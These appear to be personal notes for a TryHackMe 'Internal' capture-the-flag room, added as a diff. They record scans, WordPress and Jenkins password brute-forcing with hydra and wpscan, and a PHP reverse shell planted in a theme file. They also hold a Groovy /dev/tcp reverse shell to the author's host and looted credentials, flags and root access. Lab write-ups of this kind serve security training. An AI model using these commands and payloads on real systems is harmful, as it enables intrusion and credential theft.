@@ -1,0 +1,273 @@
+#Task 2  Deploy and Engage the Client Environment
+
+nikto -h http://10.10.171.96
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.171.96
++ Target Hostname:    10.10.171.96
++ Target Port:        80
++ Start Time:         2021-08-05 17:10:05 (GMT7)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5abef58e962a5, mtime: gzip
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
++ Uncommon header 'x-ob_mode' found, with contents: 1
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ Cookie wordpress_test_cookie created without the httponly flag
++ /blog/wp-login.php: Wordpress login found
++ 8041 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2021-08-05 17:55:34 (GMT7) (2729 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+gobuster dir -u http://10.10.171.96 -w /usr/share/wordlists/dirb/common.txt 
+
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.hta                 (Status: 403) [Size: 277]
+/blog                 (Status: 301) [Size: 311] [--> http://10.10.171.96/blog/]
+/index.html           (Status: 200) [Size: 10918]                              
+/javascript           (Status: 301) [Size: 317] [--> http://10.10.171.96/javascript/]
+/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.171.96/phpmyadmin/]
+/server-status        (Status: 403) [Size: 277]                                      
+/wordpress            (Status: 301) [Size: 316] [--> http://10.10.171.96/wordpress/] 
+                                                                                     
+
+
+gobuster dir -u http://10.10.171.96/wordpress -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.1.0
+
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/index.php            (Status: 301) [Size: 0] [--> http://10.10.171.96/wordpress/]
+/wp-admin             (Status: 301) [Size: 325] [--> http://10.10.171.96/wordpress/wp-admin/]
+/wp-content           (Status: 301) [Size: 327] [--> http://10.10.171.96/wordpress/wp-content/]
+/wp-includes          (Status: 301) [Size: 328] [--> http://10.10.171.96/wordpress/wp-includes/]
+/xmlrpc.php           (Status: 405) [Size: 42]                                                  
+
+                                                                                              
+
+# gobuster dir -u http://10.10.171.96/blog -w /usr/share/wordlists/dirb/common.txt
+
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/index.php            (Status: 301) [Size: 0] [--> http://10.10.171.96/blog/]
+/wp-admin             (Status: 301) [Size: 320] [--> http://10.10.171.96/blog/wp-admin/]
+/wp-content           (Status: 301) [Size: 322] [--> http://10.10.171.96/blog/wp-content/]
+/wp-includes          (Status: 301) [Size: 323] [--> http://10.10.171.96/blog/wp-includes/]
+/xmlrpc.php           (Status: 405) [Size: 42]                                             
+                                                                                           
+
+nmap --script vuln -p 22,80 10.10.171.96    
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 17:08 +07
+Nmap scan report for 10.10.171.96
+Host is up (0.31s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /blog/: Blog
+|   /phpmyadmin/: phpMyAdmin
+|   /wordpress/wp-login.php: Wordpress login page.
+|_  /blog/wp-login.php: Wordpress login page.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+
+Nmap done: 1 IP address (1 host up) scanned in 59.66 seconds
+
+
+#wpscan --url http://internal.thm/blog -e u
+username admin
+
+#wpscan --url http://internal.thm/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 50
+
+#wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
+WordPress theme in use: twentyseventeen
+ | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
+ | Last Updated: 2021-07-22T00:00:00.000Z
+ | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
+ | [!] The version is out of date, the latest version is 2.8
+ | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:10 <==============================================================================> (137 / 137) 100.00% Time: 00:00:10
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - admin / my2boys                                                                                         > (1255 / 14344392)  0.00%  ETA: ??:??:??
+Trying admin / ionela Time: 00:09:02 <                                   > (3885 / 14348277)  0.02%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: my2boys
+
+
+
+
+Username: admin, Password: my2boys 
+
+Login (http://internal.thm/blog/wp-admin/) is successful with admin:my2boys and we now have the ability to modify the templates PHP source code. This will be convenient to write a reverse shell.
+
+In the web interface, go to “Appearance > Theme Editor > 404.php” 
+
+cat php-reverse-shell.php
+copy change 404.php
+app
+http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+on my machine
+rlwrap nc -lnvp 1234
+wget http://10.6.88.227:8000/linpeas.sh
+./linpeas.sh
+
+/var/www/html/wordpress/wp-config.php
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wordpress' );
+define( 'DB_PASSWORD', 'wordpress123' );
+define( 'DB_HOST', 'localhost' );
+
+
+Searching passwords in config PHP files
+$dbpass='B2Ud4fEOZmVq';                                                                                                                                      
+$dbuser='phpmyadmin';
+
+mysql -u wordpress -p
+mysql>use wordpress;
+mysql>show tables;
+mysql>select * from wp_users;
+
+|  1 | admin      | $P$BOFWK.UcwNR/tV/nZZvSA6j3bz/WIp/ | admin         | admin@internal.thm | http://192.168.1.45/blog | 2020-08-03 13:19:02 |                     |           0 | admin        |                                                                                                                   
+
+find / -type f -name "*.txt" 2>/dev/null
+cat /opt/wp-save.txt
+Bill,
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+aubreanna:bubb13guM!@#123
+
+THM{int3rna1_fl4g_1}
+
+on target
+cat jenkins.txt
+Internal Jenkins service is running on 172.17.0.2:8080
+
+ip a
+....
+3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:0e:e0:4d:34 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:eff:fee0:4d34/64 scope link 
+       valid_lft forever preferred_lft forever
+
+....
+
+---> jenkin run on docker
+
+SSH Tunnel
+
+ssh aubreanna@internal.thm -L 4445:172.17.0.2:8080
+
+run http://localhost:4445 or http://127.0.0.1:4445
+
+run Burp Suite
+
+POST /j_acegi_security_check HTTP/1.1
+Host: 127.0.0.1:4445hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 4445 127.0.0.1 http-post-form '/"j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:4445/login?from=%2F
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+Origin: http://127.0.0.1:4445
+Connection: close
+Cookie: JSESSIONID.0e623792=node01451fxoz6fdj7gncznyujxiss1.node0
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Sec-GPC: 1
+
+j_username=admin&j_password=&from=%2F&Submit=Sign+in
+
+
+"/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+
+
+Brute force
+
+#hydra -l admin -P "/usr/share/wordlists/rockyou.txt" -s 4445 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password'
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-05 21:55:54
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://127.0.0.1:4445/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
+[STATUS] 39.00 tries/min, 39 tries in 00:01h, 14344360 to do in 6130:05h, 16 active
+[STATUS] 33.33 tries/min, 100 tries in 00:03h, 14344299 to do in 7172:09h, 16 active
+[4445][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-05 21:59:35
+
+
+A break down of the Hydra command is as follows:
+-s: port number
+-f: Stop brute forcing the login page once the password is found.
+-V: Display the attempts being made by Hydra and other details.
+http-form-post: Indicates the type of form being used (i.e. POST).
+^USER^: tells Hydra to use the username or list in the field.
+^PASS^: tells Hydra to use the password list supplied.
+-l: indicates a single username e.g. “admin”(use -L for a username list).
+-P: indicates use the following password list e.g. rockyou.txt
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.6.88.227/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+rlwrap nc -lnvp 5555
+bash -i
+jenkins@jenkins:/tmp$whoami
+jenkins
+
+find / -type f -name *.txt 2>/dev/null
+cat /opt/note.txt
+Aubreanna,
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+root:tr0ub13guM!@#123
+
+ssh root@10.10.76.18
+root@internal:/home/aubreanna# cat /root/root.txt
+THM{d0ck3r_d3str0y3r}
+ 
+
+https://www.aldeid.com/wiki/TryHackMe-Internal
+https://blog.usejournal.com/tryhackme-internal-writeup-d2e82acccf6f
+https://www.threatninja.net/tryhackme-internal-walkthrough/
+https://medium.com/swlh/tryhackme-internal-walkthrough-fdc6c4b569bd
+https://infosecwriteups.com/tryhackme-internal-writeup-480ce471efdd
